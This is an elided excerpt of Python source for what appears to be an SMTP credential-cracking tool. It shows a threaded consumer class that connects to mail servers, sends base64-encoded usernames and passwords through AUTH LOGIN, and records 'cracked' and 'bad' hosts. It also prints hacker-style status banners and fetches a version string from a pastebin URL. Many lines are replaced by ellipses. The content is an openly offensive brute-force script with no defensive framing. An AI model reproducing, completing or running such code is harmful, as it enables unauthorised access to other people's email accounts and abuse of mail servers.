...
try: 
    ...
    if os.name == 'nt':
        ...
        try:
            ...
            print("\033[91mTry To Install pip For Your Devices And Try 'root@usr:~$ pip install queue'\033[00m")
    ...
    def find(self):
        ...
        for k, v in enumerate(to_check):
            if k not in found:
                new.append(v)
        to_check = new
        print('\033[91m[\033[92m+\033[91m]\033[92mChecking for emails\033[97m ' + str(to_check) + '\n')
...
class consumer(threading.Thread):
    ...
    def sendCmd(self, sock, cmd):
        sock.send((cmd + "\r\n").encode('utf-8'))
        return sock.recv(900000).decode('utf-8')
    ...
    def connect(self, tupple, ssl=False):
        global bads, cracked, cache, email, randomString
        ...
        try:
            ...
            if rez[0:3] != '334':
                ...
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, base64.b64encode(user.encode('utf-8')).decode('utf-8'))
            if rez[0:3] != '334':
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)
            rez = self.sendCmd(s, base64.b64encode(passw.encode('utf-8')).decode('utf-8'))
...
try:
    vers = requests.get('https://pastebin.com/raw/WuWLQk73').text.encode('utf-8').decode('utf-8')
except:
    vers = "2.1"  # Default if can't connect
